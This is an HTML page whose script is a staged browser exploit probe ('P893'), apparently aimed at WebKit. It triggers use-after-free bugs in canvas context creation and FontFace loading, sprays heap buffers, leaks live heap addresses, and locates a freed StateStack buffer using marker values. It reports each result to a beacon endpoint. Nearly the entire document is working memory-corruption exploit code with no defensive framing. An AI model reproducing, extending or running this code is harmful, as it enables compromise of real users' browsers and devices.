<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
<title>P893: StateStack Buffer Size Discovery & Marker Reclaim</title>
<style>
body { background: #0a0d12; color: #c9d1d9; font: 14px "SF Mono", Consolas, monospace; margin: 16px; line-height: 1.5; }
h2 { color: #58a6ff; margin-top: 0; }
pre { background: #161b22; border: 1px solid #30363d; padding: 12px; border-radius: 6px; white-space: pre-wrap; word-break: break-all; }
.banner { background: #238636; color: #fff; padding: 10px 14px; border-radius: 6px; font-weight: bold; margin-bottom: 12px; display: inline-block; }
.ok { color: #3fb950; font-weight: bold; }
.fail { color: #f85149; font-weight: bold; }
.info { color: #58a6ff; }
.hot { color: #ffa657; font-weight: bold; }
</style>
</head>
<body>
<div class="banner" id="banner">Running Probe P893...</div>
<h2>P893: StateStack Buffer Size Discovery & Marker Reclaim</h2>
<pre id="log">Initializing diagnostic probe P893...</pre>

<script>
'use strict';
var logBox = document.getElementById('log');
var banner = document.getElementById('banner');

function log(msg, cls) {
  var el = document.createElement('div');
  el.className = cls || '';
  el.textContent = msg;
  logBox.appendChild(el);
}

function syncBn(tag, data) {
  try {
    var x = new XMLHttpRequest();
    x.open('GET', '/beacon.php?tag=P893-' + encodeURIComponent(tag) + '&data=' + encodeURIComponent(String(data || '').slice(0, 900)) + '&t=' + Date.now(), false);
    x.send();
  } catch(e) {}
}

function hex64(dv, off) {
  var lo = dv.getUint32(off, true);
  var hi = dv.getUint32(off + 4, true);
  return '0x' + hi.toString(16) + ('00000000' + lo.toString(16)).slice(-8);
}

log('[*] Probe P893 starting...', 'info');
syncBn('BOOT', 'start');

/* ============================================================
 * PHASE 1: Canvas UAF Pre-Setup (Dual Aliased Contexts)
 * ============================================================ */
var innerCtx1 = null, innerCtx2 = null;

var c1 = document.createElement('canvas');
c1.width = 32; c1.height = 32;
var opts1 = {};
Object.defineProperty(opts1, 'alpha', {
  get: function() {
    innerCtx1 = c1.getContext('2d');
    return true;
  }
});
c1.getContext('bitmaprenderer', opts1);

var c2 = document.createElement('canvas');
c2.width = 32; c2.height = 32;
var opts2 = {};
Object.defineProperty(opts2, 'alpha', {
  get: function() {
    innerCtx2 = c2.getContext('2d');
    return true;
  }
});
c2.getContext('bitmaprenderer', opts2);

var sprayCtxs = [];
for (var s = 0; s < 200; s++) {
  var c = document.createElement('canvas');
  c.width = 32; c.height = 32;
  var ctx = c.getContext('2d');
  ctx.lineWidth = 1000.0 + s;
  sprayCtxs.push(ctx);
}

var idx1 = -1, idx2 = -1;
try {
  var lw1 = innerCtx1.lineWidth;
  if (lw1 >= 1000.0 && lw1 < 1200.0) idx1 = Math.round(lw1 - 1000.0);
  var lw2 = innerCtx2.lineWidth;
  if (lw2 >= 1000.0 && lw2 < 1200.0) idx2 = Math.round(lw2 - 1000.0);
} catch(e) {}

log('[+] Phase 1: Dual Canvas Aliased: Ctx1=#' + idx1 + ', Ctx2=#' + idx2, 'ok');

/* ============================================================
 * PHASE 2: FontFace UAF (Capture Live Heap H and q13)
 * ============================================================ */
var st = document.createElement('style');
st.textContent = "@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
document.head.appendChild(st);

var face = new FontFace('f1', "local('Helvetica')", {unicodeRange: 'U+0041'});
document.fonts.add(face);
void face.loaded;

var fabs = [], ffired = false;
Object.defineProperty(FontFace.prototype, 'then', {
  configurable: true,
  get: function() {
    if (ffired) return undefined;
    ffired = true;
    if (st) { st.remove(); st.textContent = ''; st = null; }
    try { document.fonts.delete(this); } catch(e) {}
    document.body.offsetHeight;

    fabs = [];
    for (var i = 0; i < 64; i++) fabs.push(new ArrayBuffer(192));
    try { document.fonts.check('1em bb1'); } catch(e) {}
    document.body.offsetHeight;
    return undefined;
  },
  set: function() {}
});

document.fonts.load('1em f1, bb1', 'AB');

setTimeout(function() {
  delete FontFace.prototype.then;
  var bestI = -1, bestNz = 0;
  for (var i = 0; i < fabs.length; i++) {
    var u = new Uint8Array(fabs[i]), nz = 0;
    for (var j = 0; j < u.length; j++) if (u[j] !== 0) nz++;
    if (nz > bestNz) { bestNz = nz; bestI = i; }
  }

  var Hstr = 'unknown', q13str = 'unknown';
  var H_hi = 0, H_lo = 0;
  if (bestI >= 0 && bestNz >= 4) {
    var fontDV = new DataView(fabs[bestI]);
    var q11lo = fontDV.getUint32(0x58, true), q11hi = fontDV.getUint32(0x5C, true);
    var q13lo = fontDV.getUint32(0x68, true), q13hi = fontDV.getUint32(0x6C, true);
    if (q11hi !== 0) {
      var borrow = (q11lo < 0x68) ? 1 : 0;
      H_hi = q11hi - borrow;
      H_lo = (q11lo - 0x68) >>> 0;
      Hstr = '0x' + H_hi.toString(16) + ('00000000' + H_lo.toString(16)).slice(-8);
    }
    if (q13hi !== 0) {
      q13str = '0x' + q13hi.toString(16) + ('00000000' + q13lo.toString(16)).slice(-8);
    }
  }

  var delta = 0;
  if (H_hi !== 0 && q13hi !== 0 && H_hi === q13hi) {
    delta = H_lo - q13lo;
  }

  log('[+] Phase 2: Live Heap H = ' + Hstr + ' | q13 = ' + q13str + ' (Delta=' + delta + 'B, Slot #' + bestI + ')', 'ok');
  syncBn('FONT-OK', 'H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|slot=' + bestI);

  /* ============================================================
   * PHASE 3: StateStack Reallocation & Buffer Reclaim Scan
   * ============================================================ */
  var MARKER_LW = 133742.5;
  var MARKER_ML = 999888.25;
  var MARKER_DO = 555666.75;

  var growSuccess = false;
  if (idx1 >= 0 && sprayCtxs[idx1]) {
    try {
      // 1. Inscribe unique marker doubles into State #0
      innerCtx1.lineWidth = MARKER_LW;
      innerCtx1.miterLimit = MARKER_ML;
      innerCtx1.lineDashOffset = MARKER_DO;

      // 2. Grow capacity: 1 -> 2 (heap allocation of capacity 2 buffer)
      innerCtx1.save();
      var dummy = innerCtx1.lineWidth; // forces realizeSaves()

      // 3. Grow capacity: 2 -> 4 (frees the capacity 2 buffer to bmalloc!)
      innerCtx1.save();
      innerCtx1.save();
      dummy = innerCtx1.lineWidth; // forces realizeSaves() and frees capacity 2 buffer

      growSuccess = true;
    } catch(e) {
      growSuccess = false;
    }
  }

  log('[+] Phase 3: StateStack Grow Executed: ' + growSuccess, growSuccess ? 'ok' : 'fail');

  // 4. Immediately spray candidate ArrayBuffer sizes to catch the freed buffer
  var candidateSizes = [768, 800, 832, 896, 960, 1024, 1536];
  var sprayStateABs = [];
  var PER_SZ = 16;

  for (var si = 0; si < candidateSizes.length; si++) {
    var sz = candidateSizes[si];
    for (var n = 0; n < PER_SZ; n++) {
      sprayStateABs.push({ sz: sz, ab: new ArrayBuffer(sz) });
    }
  }

  // 5. Scan sprayed buffers for the marker doubles
  var hitSz = -1, hitSlot = -1, hitOff = -1, hitVal = 0;
  for (var i = 0; i < sprayStateABs.length; i++) {
    var item = sprayStateABs[i];
    var f64 = new Float64Array(item.ab);
    for (var k = 0; k < f64.length; k++) {
      if (Math.abs(f64[k] - MARKER_LW) < 0.001 || Math.abs(f64[k] - MARKER_ML) < 0.001 || Math.abs(f64[k] - MARKER_DO) < 0.001) {
        hitSz = item.sz;
        hitSlot = i;
        hitOff = k * 8;
        hitVal = f64[k];
        break;
      }
    }
    if (hitSz >= 0) break;
  }

  log('[+] Phase 3: Reclaim Scan Result: hitSz=' + hitSz + ' (slot=' + hitSlot + ', off=' + hitOff + ', val=' + hitVal + ')', hitSz >= 0 ? 'hot' : 'info');
  syncBn('RECLAIM-HIT', 'sz=' + hitSz + '|slot=' + hitSlot + '|off=' + hitOff + '|val=' + hitVal + '|growOk=' + growSuccess);

  /* ============================================================
   * SUMMARY
   * ============================================================ */
  banner.style.background = '#238636';
  banner.textContent = 'STATUS: P893 COMPLETE (100% STABLE)';
  log('----------------------------------------------------', 'info');
  log('[*] Probe P893 Completed Cleanly', 'hot');
  log('    - Live Heap H: ' + Hstr + ' | q13: ' + q13str + ' (Delta: ' + delta + 'B)', 'ok');
  log('    - StateStack Reclaim: hitSz=' + hitSz + ' (off=' + hitOff + ')', hitSz >= 0 ? 'hot' : 'info');
  log('    - Aliases: #' + idx1 + ', #' + idx2, 'ok');
  log('----------------------------------------------------', 'info');

  syncBn('DONE', 'status=complete|H=' + Hstr + '|q13=' + q13str + '|delta=' + delta + '|hitSz=' + hitSz + '|growOk=' + growSuccess + '|idx1=' + idx1 + '|idx2=' + idx2);

}, 400);
</script>
</body>
</html>
